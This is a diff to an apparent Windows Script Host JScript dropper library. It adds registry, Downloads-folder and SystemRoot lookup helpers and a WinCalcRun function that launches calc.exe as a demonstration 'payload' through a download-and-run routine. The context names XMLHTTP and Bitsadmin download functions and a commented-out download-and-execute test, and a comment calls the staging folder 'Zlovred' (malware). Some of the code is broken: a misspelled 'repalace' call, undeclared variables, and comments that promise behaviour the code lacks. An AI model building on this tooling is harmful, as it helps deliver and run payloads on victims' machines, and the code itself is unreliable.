@@ -10,6 +10,176 @@
  *
  ******************************************************************************/
 
+/*******************************************************************************
+ *
+ * Wsleep(Timesec)
+ * This function will sleep current job execution at Timesec seconds timeout
+ * This Function use a Windows system utilite Timeout
+ ******************************************************************************/
+function Wsleep(Timesec) {
+    var objWsh;
+    var strRun; // Execution String
+    objWsh = new ActiveXObject("WScript.Shell");
+    strRun = "Timeout /T " + Timesec + " /nobreak";
+    objWsh.Run( strRun, 0, true);
+    objWsh = null;
+}
+
+/***********************************************************
+    ' RegKeyRead001 Function
+    ' This Function Read the Key RegistryKey and Returns
+    ' a Key Value String
+    ' *********************************************************/
+    function RegKeyRead001(registryKey) {
+        var winScriptShell;
+        var strRes;
+
+        winScriptShell = new ActiveXObject("WScript.Shell");
+        strRes = winScriptShell.RegRead(registryKey);
+        return strRes;
+    }
+
+    /**********************************************************
+    ' RegKeyRead002 Function
+    ' This Function Read the Key RegistryKey and Returns
+    ' a Key Value String
+    ' *********************************************************/
+    function RegKeyRead002(RootKey, KeyName, ValueName, Architecture) {
+        var oCtx, oLocator, oWMI, oReg, oInParams, oOutParams;
+        var anEnumKey;
+        oCtx = new ActiveXObject("WbemScripting.SWbemNamedValueSet");
+        if (typeof Architecture === 'undefined')
+            if (WshShell.Environment("SYSTEM").Item("PROCESSOR_ARCHITECTURE").search(/64/ig) >= 0)
+                Architecture = 64
+            else
+                Architecture = 32;
+        anEnumKey = KeyName + "\\" + ValueName;
+        oCtx.Add("__ProviderArchitecture", Architecture);
+        oLocator = new ActiveXObject("Wbemscripting.SWbemLocator");
+        oWMI = oLocator.ConnectServer("", "root\\default", "", "", "", "", 0, oCtx);
+        oReg = oWMI.Get("StdRegProv");
+
+        var oInParams = oReg.Methods_("GetStringValue").Inparameters;
+        oInParams.Hdefkey = RootKey;
+        oInParams.Ssubkeyname = KeyName;
+        oInParams.Svaluename = ValueName;
+        // WScript.Echo("KeyName= "+KeyName+"\nValueName= " + ValueName);
+      
+        oOutParams = oReg.ExecMethod_("GetStringValue", oInParams, 0, oCtx);
+        if( oOutParams == null) {
+            return "";
+        }
+        if( oOutParams.SValue == null) {
+            return "";
+        }
+        return oOutParams.SValue;
+    }
+
+/***********************************************************
+'
+' getDownlEnviron01()
+' This Function Returns the Path for User Variable TEMP
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path for Download Directory if Exists or
+'               Path for User Variable %TEMP% if Success or
+'               "C:\Windows\Temp" if API Error or
+'				"" if General Sysytem Error
+'
+' *****************************************************************************/
+function getDownlEnviron01() {
+    var fso, wsh, envProc, envSys, pathTemp;
+    var envVariable; // Download Temprorary Folder
+    // Downloads Folder Registry Key
+    var GUID_WIN_DOWNLOADS_FOLDER;
+    var KEY_PATH; 
+    var aKey;
+	GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}";
+	KEY_PATH = "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\";
+	aKey = KEY_PATH + GUID_WIN_DOWNLOADS_FOLDER;
+    //
+    // Define ActiveX Objects
+    fso = new ActiveXObject("Scripting.FileSystemObject");
+    wsh = new ActiveXObject("WScript.Shell");
+    // Define Process Environment Variable
+	envProc = wsh.Environment("PROCESS");
+    // Define System Environment Variable
+	envSys = wsh.Environment;
+    //
+    // Define Downloads Temporary Folder
+    pathTemp = RegKeyRead001(aKey);
+    // WScript.Echo("Path = " + pathTemp);
+    if(pathTemp.indexOf("%USERPROFILE%", 0) != -1) {
+        envVariable = pathTemp.repalace("%USERPROFILE%", envProc("USERPROFILE"));
+    }
+    else {
+        envVariable = pathTemp;
+    }
+    if(!fso.FolderExists(envVariable)) {
+        envVariable = envProc("TEMP");
+        if(!fso.FolderExists(envVariable)) {
+            envVariable = envSys("TMP");
+            if(!fso.FolderExists(envVariable)) {
+                envVariable = "";
+            }
+        }
+    }
+    return envVariable;
+}
+
+/**********************************************************
+'
+' getDownlEnviron02()
+' This Function Returns the Path for User Variable TEMP
+'
+' PARAMETERS:   NONE
+' RETURNS:      Path for Download Directory if Exists or
+'               Path for User Variable %TEMP% if Success or
+'               "C:\Windows\Temp" if API Error or
+'				"" if General Sysytem Error
+'
+' *****************************************************************************/
+function getDownlEnviron02() {
+    var HKCR = 0x80000000; //HKEY_CLASSES_ROOT
+	var HKCU = 0x80000001; //HKEY_CURRENT_USER
+	var HKLM = 0x80000002; //HKEY_LOCAL_MACHINE
+	var HKUS = 0x80000003; //HKEY_USERS
+	var HKCC = 0x80000005; //HKEY_CURRENT_CONFIG
+    var fso, wsh, envProc, envSys, pathTemp, envVariable;
+    var GUID_WIN_DOWNLOADS_FOLDER;
+    var KEY_PATH;
+    GUID_WIN_DOWNLOADS_FOLDER = "{374DE290-123F-4565-9164-39C4925E467B}";
+	KEY_PATH1 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\\";
+	//
+	// Define ActiveX Objects
+    fso = new ActiveXObject("Scripting.FileSystemObject");
+    wsh = new ActiveXObject("WScript.Shell");
+    // Define Process Environment Variable
+	envProc = wsh.Environment("PROCESS");
+    // Define System Environment Variable
+	envSys = wsh.Environment;
+    //
+    // Define Downloads Temporary Folder
+    pathTemp = RegKeyRead002(HKCU, KEY_PATH1, GUID_WIN_DOWNLOADS_FOLDER, 32);
+    // WScript.Echo("Path = " + pathTemp);
+    if(pathTemp.indexOf("%USERPROFILE%", 0) != -1) {
+        envVariable = pathTemp.repalace("%USERPROFILE%", envProc("USERPROFILE"));
+    }
+    else {
+        envVariable = pathTemp;
+    }
+    if(!fso.FolderExists(envVariable)) {
+        envVariable = envProc("TEMP");
+        if(!fso.FolderExists(envVariable)) {
+            envVariable = envSys("TMP");
+            if(!fso.FolderExists(envVariable)) {
+                envVariable = "";
+            }
+        }
+    }
+    return envVariable;
+}
+
 /* *****************************************************************************
 '
 ' getTempEnviron()
@@ -111,6 +281,45 @@ function getXmlHttp02() {
 		return "";
 	}
 }
+
+/* *****************************************************************************
+ '
+ ' getSystemRoot()
+ ' This Function Returns the Path for %SystemRoot%
+ '
+ ' PARAMETERS:   NONE
+ ' RETURNS:      Path for %SystemRoot% Directory if Exists or
+ '               Path for User Variable %windir% if Success or
+ '				"" if General Sysytem Error
+ '
+ ' *****************************************************************************/
+function getSystemRoot() {
+    var fso, wsh, envProc, envSys;
+    var strZlFolder; // Zlovred Temprorary Folder
+    // Define ActiveX Objects
+    fso = new ActiveXObject("Scripting.FileSystemObject");
+    wsh = new ActiveXObject("WScript.Shell");
+    // Define Process Environment Variable
+    envProc = wsh.Environment("PROCESS");
+    // Define System Environment Variable
+    envSys = wsh.Environment;
+    // Define Zlovred Temprorary Folder
+    strZlFolder = "";
+    // Define and Check Environment Variables
+    var envVariable;
+    envVariable = strZlFolder;
+    if(!fso.FolderExists(envVariable)) {
+        envVariable = envProc("SystemRoot");
+        if(!fso.FolderExists(envVariable)) {
+            envVariable = envSys("windir");
+            if(!fso.FolderExists(envVariable)) {
+                envVariable = "";
+            }
+        }
+    }
+    return envVariable;
+}
+    
 /* *********************************************************
  * Function getXmlHttp01
  * This Function Registers XMLHTTP Object both at
@@ -1139,6 +1348,35 @@ function RunStopImmediately() {
 	//    setTimeout( DoNothing, intTimeOut );
 	// Stop Script on intTimeOut miliseconds for Wait if  Bitsadmin done 
 }
+
+/**********************************************************
+ * WinCalcRun()
+ * This Function will Run a Windows Calculator
+ * Executable File on Windows Computer
+ * 
+ * PARAMETERS:	NONE
+ * RETURN:		NONE
+ *********************************************************/
+function WinCalcRun(){
+
+	// Define Variables
+	var theFile="System32\\calc.exe";
+	var tempFolder;
+	var iTimeOut = 3; // 3 sec time out
+
+	// Get and Check a System Root
+	tempFolder = getSystemRoot();
+	// tempFolder = "C:\\Windows"
+		
+	if(tempFolder === "") {
+		return;
+	}
+
+	// Run a Payload
+	RunDownloadedExe03(tempFolder, theFile, "", iTimeOut);
+	return;
+}
+
 /* ********************************************************
 '
 ' TEST Run echo Files
@@ -1170,3 +1408,4 @@ function Test_Echo_Files() {
 	//iFlag = ExeDownlRunIfChecked03( strURLPath, exeEcho, "", "", "C:\\WINDOWS\\System3");
 }
 //Test_Echo_Files();
+// WinCalcRun();
